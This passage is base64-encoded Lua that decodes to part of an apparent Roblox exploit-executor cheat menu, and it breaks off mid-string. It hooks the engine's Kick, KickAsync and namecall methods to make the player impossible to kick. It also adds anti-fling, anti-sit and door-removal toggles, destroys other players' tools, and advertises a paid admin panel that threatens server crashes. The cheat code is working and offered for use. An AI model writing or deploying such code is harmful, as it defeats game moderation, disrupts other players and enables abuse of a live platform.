ICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcikKICAgICAgICAgICAgbG9jYWwgaHVtID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgaHVtLlRvdWNoZWQ6Q29ubmVjdChmdW5jdGlvbihoaXQpCiAgICAgICAgICAgICAgICBmb3IgXywgcnVsZSBpbiBpcGFpcnMoYmxhY2tsaXN0KSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGhpdC5OYW1lID09IHJ1bGUuTmFtZSBhbmQgaGl0LkNsYXNzTmFtZSA9PSBydWxlLkNsYXNzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbmV1dHJhbGl6ZShoaXQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKVGFiMTg6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQW50aS1LaWNrIChpcnJldmVyc2libGUpLiIsCiAgICBEZXNjcmlwdGlvbiA9ICLwn5OE77ixQmVjb21lcyBpbXBvc3NpYmxlIHRvIGJlIGtpY2tlZC4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCgogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKICAgICAgICBsb2NhbCBnZXRNVCA9IGdldHJhd21ldGF0YWJsZSBvciBkZWJ1Zy5nZXRtZXRhdGFibGUKICAgICAgICBsb2NhbCBzZXRSTyA9IHNldHJlYWRvbmx5IG9yIGZ1bmN0aW9uKHQsYikgZW5kCiAgICAgICAgbG9jYWwgaG9va05hbWVjYWxsID0gaG9va21ldGFtZXRob2QKICAgICAgICBsb2NhbCBob29rRnVuYyA9IGhvb2tmdW5jdGlvbgoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IGdldE1UIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgbG9jYWwgbXQgPSBnZXRNVChnYW1lKQogICAgICAgICAgICBpZiBub3QgbXQgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICBzZXRSTyhtdCwgZmFsc2UpCgogICAgICAgICAgICBsb2NhbCBvbGRLaWNrCiAgICAgICAgICAgIG9sZEtpY2sgPSBob29rRnVuYyhMb2NhbFBsYXllci5LaWNrLCBmdW5jdGlvbiguLi4pIAogICAgICAgICAgICAgICAgcmV0dXJuIG5pbCAKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgb2xkS2lja0FzeW5jCiAgICAgICAgICAgIG9sZEtpY2tBc3luYyA9IGhvb2tGdW5jKExvY2FsUGxheWVyLktpY2tBc3luYywgZnVuY3Rpb24oLi4uKQogICAgICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsb2NhbCBvbGROYW1lY2FsbAogICAgICAgICAgICBvbGROYW1lY2FsbCA9IGhvb2tOYW1lY2FsbChnYW1lLCBmdW5jdGlvbihzZWxmLCAuLi4pCiAgICAgICAgICAgICAgICBsb2NhbCBtZXRob2QgPSBnZXRuYW1lY2FsbG1ldGhvZCgpCiAgICAgICAgICAgICAgICBpZiBtZXRob2QgPT0gIktpY2siIG9yIG1ldGhvZCA9PSAiS2lja0FzeW5jIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICByZXR1cm4gb2xkTmFtZWNhbGwoc2VsZiwgLi4uKQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsb2NhbCBvbGREZXN0cm95CiAgICAgICAgICAgIG9sZERlc3Ryb3kgPSBob29rRnVuYyhMb2NhbFBsYXllci5EZXN0cm95LCBmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIG9sZEtpY2syCiAgICAgICAgICAgIG9sZEtpY2syID0gaG9va0Z1bmMoTG9jYWxQbGF5ZXIuUGFyZW50Ll9faW5kZXgsIGZ1bmN0aW9uKHNlbGYsIGtleSkKICAgICAgICAgICAgICAgIGlmIGtleSA9PSAiUGFyZW50IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFBsYXllcnMKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgcmV0dXJuIG9sZEtpY2syKHNlbGYsIGtleSkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgZGVidWcuc2V0Y29uc3RhbnQob2xkS2ljaywgMSwgbmlsKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIHNldFJPKG10LCB0cnVlKQogICAgICAgIGVuZCkKCiAgICBlbmQKfSkKClRhYjE4OkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIkFudGktVm9pZCAoYmV0YSkiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sVByZXZlbnRzIHlvdSBmcm9tIGZhbGxpbmcgaW50byB0aGUgdm9pZC4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBpZiBfRy5fX0FudGlWb2lkQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICBfRy5fX0FudGlWb2lkQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBfRy5fX0FudGlWb2lkQ29ubmVjdGlvbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgICAgICAgICAgICAgIGlmIHJvb3QgYW5kIHJvb3QuUG9zaXRpb24uWSA8PSAtNDAgdGhlbgogICAgICAgICAgICAgICAgICAgIHJvb3QuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAxMDAwLCAwKQogICAgICAgICAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gcm9vdC5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLCA1LCAwKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiBfRy5fX0FudGlWb2lkQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICBfRy5fX0FudGlWb2lkQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIF9HLl9fQW50aVZvaWRDb25uZWN0aW9uID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgIGVuZAp9KQogICAKVGFiMTg6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aS1GbGluZyBjYXJzIiwKICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IEFudGlGbGluZ0xvb3AoIlZlaGljbGVzIiwgZnVuY3Rpb24oKQogICAgICAgIHJldHVybiBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVzIikKICAgIGVuZCkKfSkKClRhYjE4OkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIkFudGktRmxpbmcgY2Fub2UiLAogICAgRGVzY3JpcHRpb24gPSAiIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gQW50aUZsaW5nTG9vcCgiQ2Fub2VzIiwgZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHdvcmtzcGFjZUNvbSA9IFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiV29ya3NwYWNlQ29tIikKICAgICAgICByZXR1cm4gd29ya3NwYWNlQ29tIGFuZCB3b3Jrc3BhY2VDb206RmluZEZpcnN0Q2hpbGQoIjAwMV9DYW5vZVN0b3JhZ2UiKQogICAgZW5kKQp9KQoKVGFiMTg6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aS1GbGluZyBqZXRzIiwKICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IEFudGlGbGluZ0xvb3AoIkpldHMiLCBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgZm9sZGVyID0gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJXb3Jrc3BhY2VDb20iKQogICAgICAgIGlmIGZvbGRlciBhbmQgZm9sZGVyOkZpbmRGaXJzdENoaWxkKCIwMDFfQWlycG9ydCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgc3RvcmFnZSA9IGZvbGRlclsiMDAxX0FpcnBvcnQiXTpGaW5kRmlyc3RDaGlsZCgiQWlycG9ydEhhbmdlciIpCiAgICAgICAgICAgIGlmIHN0b3JhZ2UgdGhlbiByZXR1cm4gc3RvcmFnZTpGaW5kRmlyc3RDaGlsZCgiMDAxX0pldFN0b3JhZ2UiKSBhbmQgc3RvcmFnZVsiMDAxX0pldFN0b3JhZ2UiXTpGaW5kRmlyc3RDaGlsZCgiSmV0QWlycG9ydCIpIGVuZAogICAgICAgIGVuZAogICAgZW5kKQp9KQoKVGFiMTg6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aS1GbGluZyBoZWxpY29wdGVycyIsCiAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBBbnRpRmxpbmdMb29wKCJIZWxpcyIsIGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBmb2xkZXIgPSBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIldvcmtzcGFjZUNvbSIpCiAgICAgICAgcmV0dXJuIGZvbGRlciBhbmQgZm9sZGVyOkZpbmRGaXJzdENoaWxkKCIwMDFfSGVsaVN0b3JhZ2UiKSBhbmQgZm9sZGVyWyIwMDFfSGVsaVN0b3JhZ2UiXTpGaW5kRmlyc3RDaGlsZCgiUG9saWNlU3RhdGlvbkhlbGkiKQogICAgZW5kKQp9KQoKVGFiMTg6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aS1GbGluZyBiYWxscyIsCiAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBBbnRpRmxpbmdMb29wKCJCYWxscyIsIGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBmb2xkZXIgPSBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIldvcmtzcGFjZUNvbSIpCiAgICAgICAgcmV0dXJuIGZvbGRlciBhbmQgZm9sZGVyOkZpbmRGaXJzdENoaWxkKCIwMDFfU29jY2VyQmFsbHMiKQogICAgZW5kKQp9KQoKCl9HLkFudGlTaXRBY3RpdmUgPSBmYWxzZQoKVGFiMTg6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aS1TaXQiLAogICAgRGVzY3JpcHRpb24gPSAiIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCgogICAgICAgIF9HLkFudGlTaXRBY3RpdmUgPSBzdGF0ZQogICAgICAgIFRlbGVwb3J0Q2Fycm86TW9zdHJhck5vdGlmaWNhY2FvKCJBbnRpLVNpdCAiIC4uIChzdGF0ZSBhbmQgImVuYWJsZWQhIiBvciAiZGlzYWJsZWQhIikpCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5BbnRpU2l0QWN0aXZlIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyID0gUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGlmIGNoYXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgaWYgaHVtIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGh1bTpHZXRTdGF0ZSgpID09IEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bTpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkdldHRpbmdVcCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIC0tIHJlYXRpdmEgcXVhbmRvIGRlc2xpZ2EKICAgICAgICAgICAgbG9jYWwgY2hhciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIGNoYXIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgIGlmIGh1bSB0aGVuCiAgICAgICAgICAgICAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgdHJ1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKClRhYjE4OkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIkFudGktTGFnIiwKICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIGRlZHVwTG9jayA9IHt9CiAgICAgICAgbG9jYWwgSUdOT1JFRF9QTEFZRVIKCiAgICAgICAgaWYgbm90IHN0YXRlIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBtYXJjYXJJZ25vcmFkbyhwbGF5ZXIpCiAgICAgICAgICAgIElHTk9SRURfUExBWUVSID0gcGxheWVyCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGlzVGFyZ2V0VG9vbChpbnN0KQogICAgICAgICAgICByZXR1cm4gaW5zdDpJc0EoIlRvb2wiKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBnYXRoZXJUb29scyhwbGF5ZXIpCiAgICAgICAgICAgIGxvY2FsIGZvdW5kID0ge30KICAgICAgICAgICAgbG9jYWwgY29udGFpbmVycyA9IHt9CiAgICAgICAgICAgIGlmIHBsYXllci5DaGFyYWN0ZXIgdGhlbiB0YWJsZS5pbnNlcnQoY29udGFpbmVycywgcGxheWVyLkNoYXJhY3RlcikgZW5kCiAgICAgICAgICAgIGxvY2FsIGJhY2twYWNrID0gcGxheWVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQmFja3BhY2siKQogICAgICAgICAgICBpZiBiYWNrcGFjayB0aGVuIHRhYmxlLmluc2VydChjb250YWluZXJzLCBiYWNrcGFjaykgZW5kCiAgICAgICAgICAgIGxvY2FsIHNnID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJTdGFydGVyR2VhciIpCiAgICAgICAgICAgIGlmIHNnIHRoZW4gdGFibGUuaW5zZXJ0KGNvbnRhaW5lcnMsIHNnKSBlbmQKICAgICAgICAgICAgZm9yIF8sIGNvbnRhaW5lciBpbiBpcGFpcnMoY29udGFpbmVycykgZG8KICAgICAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBpcGFpcnMoY29udGFpbmVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgaXNUYXJnZXRUb29sKGNoaWxkKSB0aGVuIHRhYmxlLmluc2VydChmb3VuZCwgY2hpbGQpIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICByZXR1cm4gZm91bmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gZGVkdXBlUGxheWVyKHBsYXllcikKICAgICAgICAgICAgaWYgcGxheWVyID09IElHTk9SRURfUExBWUVSIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBpZiBkZWR1cExvY2tbcGxheWVyXSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgZGVkdXBMb2NrW3BsYXllcl0gPSB0cnVlCiAgICAgICAgICAgIGxvY2FsIHRvb2xzID0gZ2F0aGVyVG9vbHMocGxheWVyKQogICAgICAgICAgICBpZiAjdG9vbHMgPiAxIHRoZW4KICAgICAgICAgICAgICAgIGZvciBpID0gMiwgI3Rvb2xzIGRvIHBjYWxsKGZ1bmN0aW9uKCkgdG9vbHNbaV06RGVzdHJveSgpIGVuZCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBkZWR1cExvY2tbcGxheWVyXSA9IGZhbHNlCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGhvb2tQbGF5ZXIocGxheWVyKQogICAgICAgICAgICBpZiBub3QgSUdOT1JFRF9QTEFZRVIgdGhlbiBtYXJjYXJJZ25vcmFkbyhwbGF5ZXIpIGVuZAogICAgICAgICAgICB0YXNrLmRlZmVyKGRlZHVwZVBsYXllciwgcGxheWVyKQogICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBzZXR1cENoYXIoY2hhcikKICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoMC41LCBmdW5jdGlvbigpIGRlZHVwZVBsYXllcihwbGF5ZXIpIGVuZCkKICAgICAgICAgICAgICAgIGNoYXIuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQogICAgICAgICAgICAgICAgICAgIGlmIGlzVGFyZ2V0VG9vbChjaGlsZCkgdGhlbiB0YXNrLmRlbGF5KDAuMSwgZnVuY3Rpb24oKSBkZWR1cGVQbGF5ZXIocGxheWVyKSBlbmQpIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciB0aGVuIHNldHVwQ2hhcihwbGF5ZXIuQ2hhcmFjdGVyKSBlbmQKICAgICAgICAgICAgcGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3Qoc2V0dXBDaGFyKQogICAgICAgICAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIiwgMTApCiAgICAgICAgICAgIGlmIGJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgIGJhY2twYWNrLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICAgICAgICAgICAgICBpZiBpc1RhcmdldFRvb2woY2hpbGQpIHRoZW4gdGFzay5kZWxheSgwLjEsIGZ1bmN0aW9uKCkgZGVkdXBlUGxheWVyKHBsYXllcikgZW5kKSBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGxvY2FsIHNnID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJTdGFydGVyR2VhciIpIG9yIHBsYXllcjpXYWl0Rm9yQ2hpbGQoIlN0YXJ0ZXJHZWFyIiwgMTApCiAgICAgICAgICAgIGlmIHNnIHRoZW4KICAgICAgICAgICAgICAgIHNnLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICAgICAgICAgICAgICBpZiBpc1RhcmdldFRvb2woY2hpbGQpIHRoZW4gdGFzay5kZWxheSgwLjEsIGZ1bmN0aW9uKCkgZGVkdXBlUGxheWVyKHBsYXllcikgZW5kKSBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChob29rUGxheWVyKQogICAgICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbyBob29rUGxheWVyKHBscikgZW5kCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBzdGF0ZSBkbwogICAgICAgICAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvIGRlZHVwZVBsYXllcihwbHIpIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKVGFiMTg6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aS1GbGluZyBkb29ycyIsCiAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBpZiBub3QgX0cuaGlkZGVuRG9vcnMgdGhlbiBfRy5oaWRkZW5Eb29ycyA9IHt9IGVuZAogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgX0cuaGlkZGVuRG9vcnMgPSB7fQogICAgICAgICAgICBmb3IgXywgb2JqIGluIGlwYWlycyh3b3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIG9iajpJc0EoIkJhc2VQYXJ0IikgYW5kIG9iai5OYW1lOmxvd2VyKCk6ZmluZCgiZG9vciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBkb29yRGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgZG9vciA9IG9iaiwKICAgICAgICAgICAgICAgICAgICAgICAgb3JpZ2luYWxUcmFuc3BhcmVuY3kgPSBvYmouVHJhbnNwYXJlbmN5LAogICAgICAgICAgICAgICAgICAgICAgICBvcmlnaW5hbENhbkNvbGxpZGUgPSBvYmouQ2FuQ29sbGlkZSwKICAgICAgICAgICAgICAgICAgICAgICAgb3JpZ2luYWxDYXN0U2hhZG93ID0gb2JqLkNhc3RTaGFkb3cKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgb2JqLlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICBvYmouQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgb2JqLkNhc3RTaGFkb3cgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBpcGFpcnMob2JqOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGlsZC5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGlsZC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGNoaWxkOklzQSgiU3VyZmFjZUd1aSIpIG9yIGNoaWxkOklzQSgiQmlsbGJvYXJkR3VpIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChfRy5oaWRkZW5Eb29ycywgZG9vckRhdGEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHByaW50KCLDsMW44oCdwqcgIiAuLiAjX0cuaGlkZGVuRG9vcnMgLi4gIiBoaWRkZW4gZG9vcnMhIikKICAgICAgICBlbHNlCiAgICAgICAgICAgIGZvciBfLCBkb29yRGF0YSBpbiBpcGFpcnMoX0cuaGlkZGVuRG9vcnMgb3Ige30pIGRvCiAgICAgICAgICAgICAgICBpZiBkb29yRGF0YS5kb29yIGFuZCBkb29yRGF0YS5kb29yLlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZG9vckRhdGEuZG9vci5UcmFuc3BhcmVuY3kgPSBkb29yRGF0YS5vcmlnaW5hbFRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgIGRvb3JEYXRhLmRvb3IuQ2FuQ29sbGlkZSA9IGRvb3JEYXRhLm9yaWdpbmFsQ2FuQ29sbGlkZQogICAgICAgICAgICAgICAgICAgIGRvb3JEYXRhLmRvb3IuQ2FzdFNoYWRvdyA9IGRvb3JEYXRhLm9yaWdpbmFsQ2FzdFNoYWRvdwogICAgICAgICAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBpcGFpcnMoZG9vckRhdGEuZG9vcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGlsZDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGNoaWxkOklzQSgiU3VyZmFjZUd1aSIpIG9yIGNoaWxkOklzQSgiQmlsbGJvYXJkR3VpIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGQuRW5hYmxlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHByaW50KCJTdWNlc3MhICIgLi4gIyhfRy5oaWRkZW5Eb29ycyBvciB7fSkgLi4gIiByZXN0b3JlZCBkb29ycyEiKQogICAgICAgICAgICBfRy5oaWRkZW5Eb29ycyA9IHt9CiAgICAgICAgZW5kCiAgICBlbmQKfSkKCmxvY2FsIFRhYjE2ID0gV2luZG93Ok1ha2VUYWIoeyLvuLFBZG1pbiBQYW5lbCBbQVZBSUxBQkxFXSIsICJyYnhhc3NldGlkOi8vMTAxODAxMzQ2NDY1MDcxIn0pCgpTZWN0aW9uID0gVGFiMTY6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIklmIHlvdSBhcmVuJ3Qgb24gdGhlIGxpc3QsIGdvIHRvIGRpc2NvcmQgYW5kIHB1cmNoYXNlLiIKfSkKClRhYjE2OkFkZFBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICLimqDvuI/vuLFOT1QgT04gTElTVCA9IFNFUlZFUiBDUkFTSC9LSUNLLiIsCiAgICBDb250ZW50ID0gIm5pbC4iCn0pCgpUYWIxNjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJBZG1pbiBQYW5lbCIsCiAgICBEZXNjcmlwdGlvbiA9ICJNZXJyeSBDaHJpc3RtYXMhIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFBsYXllckd1aSA9IExvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikKbG9jYWwgVGV4dENoYXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUZXh0Q2hhdFNlcnZpY2UiKQpsb2NhbCBSZXBsaW